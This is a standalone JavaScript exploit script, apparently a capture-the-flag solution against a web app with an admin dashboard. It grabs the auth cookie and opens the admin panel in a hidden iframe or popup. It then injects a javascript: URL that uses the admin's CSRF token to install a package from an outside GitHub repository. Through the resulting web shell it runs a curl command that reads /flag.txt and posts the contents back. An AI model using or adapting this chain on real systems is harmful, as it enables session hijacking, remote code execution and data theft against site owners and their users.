(async()=>{
const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const ck=document.cookie.split(';').map(x=>x.trim()).find(x=>x.startsWith('auth='))||document.cookie.split(';')[0]||'';
const stage=`(async()=>{
const clean=s=>String(s).replace(/[^A-Za-z0-9 !.:()]/g,' ');
const log=t=>fetch('http://app/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(clean(t))}).catch(()=>{});
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const repo={platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'};
const api=async(p,d)=>{
 let f=new FormData();
 f.append('__csrf__',document.querySelector('meta[name=csrf]').content);
 f.append('__json__',JSON.stringify(d));
 let r=await fetch(p,{method:'POST',body:f});
 let t=await r.text().catch(()=>'');
 log(p+' '+r.status+' '+t.slice(0,80));
 return r.status;
};
try{
 log('admin stage');
 await sleep(1200);
 if(!document.querySelector('meta[name=csrf]')){log('csrf none');return}
 log('csrf ok');
 await api('/_api/package-manager/add-repository',repo);
 await api('/_api/package-manager/install',{package:'2ash1/static'});
 await sleep(2000);
 let ck=decodeURIComponent(location.hash.slice(1));
 let cmd='curl -s -X POST http://app/edit -H "Cookie: '+ck.replace(/"/g,'')+'" --data title=flag --data-urlencode content="$(python3 -c \\'print(open("/flag.txt","rb").read().hex())\\')"';
 location.href='/packages/2ash1/static/index.php?cmd='+encodeURIComponent(cmd);
}catch(e){log('err '+e.name+' '+e.message)}
})()`;
const jsurl='javascript:'+encodeURIComponent(stage);
const admin='http://admin-app/dashboard/home#'+encodeURIComponent(ck);
post('chain start');
post(ck?'cookie ok':'cookie none');

let fr=document.createElement('iframe');
fr.src=admin;
fr.style='width:1px;height:1px;position:fixed;left:-10px;top:-10px;opacity:.01';
document.body.appendChild(fr);
post('iframe open');
await sleep(3500);
try{
 fr.contentWindow.location=jsurl;
 post('iframe jsurl');
}catch(e){
 post('iframe err '+e.name);
}

let w=null;
try{
 w=open(admin,'amchain');
 post(w?'popup open':'popup none');
}catch(e){
 post('popup err '+e.name);
}
await sleep(3500);
try{
 if(w){
  w.location=jsurl;
  post('popup jsurl');
 }
}catch(e){
 post('popup nav err '+e.name);
}
})();
